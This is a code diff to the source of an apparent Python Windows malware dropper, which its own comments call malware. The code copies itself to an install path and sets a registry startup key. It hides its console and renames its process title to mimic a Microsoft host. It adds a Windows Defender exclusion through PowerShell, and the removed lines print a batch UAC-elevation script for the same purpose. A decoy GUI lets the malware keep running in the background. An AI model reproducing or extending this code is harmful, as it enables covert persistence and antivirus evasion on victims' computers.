@@ -1,4 +1,5 @@
 import execute_script as exc # Code we want to execute on boot
+import zeno_embed_func as zeno
 import os
 import os.path
 import winreg as reg
@@ -6,6 +7,7 @@ from pathlib import Path
 import shutil
 import win32gui, win32con
 import ctypes
+import multiprocessing
 
 #? Options & Settings ?#
 # 1 = On
@@ -14,6 +16,7 @@ install_set=int(1) # Install to custom directory [ HAS TO BE SET TO 1, BROKEN SC
 startup_set=int(1) # Startup with windows at login screen
 hide_console=int(0) # Hide console on startup and execution
 add_exclusion=int(1) # Add Exclusion to Windows Antivirus through Powershell (Only requires admin rights once)
+exec_dumb=int(1) # Execute a piece of code if the EXE is ran by the user (Malware will still run in background without GUI)
 ctypes.windll.kernel32.SetConsoleTitleW("Microsoft (R) Aggregator Host") # Change Process Title/Handle
 
 # /?data_inf?/ #
@@ -52,8 +55,6 @@ class install_embed():
         # now close the opened key
         reg.CloseKey(open)
 
-
-
 class setup_proc():
     def chk_ins():
         if install_set == 1: # Install to Directory #
@@ -67,43 +68,16 @@ class setup_proc():
             win32gui.ShowWindow(hide , win32con.SW_HIDE)
         if add_exclusion == 1:
             if install_embed_return == 0:
-                with open(f"{install_path}\\admin.bat", "w") as admin:
-                    admin.write(f'''
-@echo off
-
-:: BatchGotAdmin
-:-------------------------------------
-REM  --> Check for permissions
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
-
-REM --> If error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-:--------------------------------------    
-powershell.exe -Command Add-MpPreference -ExclusionPath "{install_path}"
-                ''')
-                os.system(f'{install_path}\\admin.bat')
+                script=str(f'powershell.exe -Command Add-MpPreference -ExclusionPath "{install_path}"')
+                zeno.powershell(install_path=install_path, script=script)
         # /?Execute Code?/ #
-        exc.exec.main_func() # Code to Execute #
+        exc.exec.main_func()
+
+class gui():
+    def menu():
+        print("""
+ok
+        """)
 
 if __name__=="__main__":
     setup_proc.chk_ins()
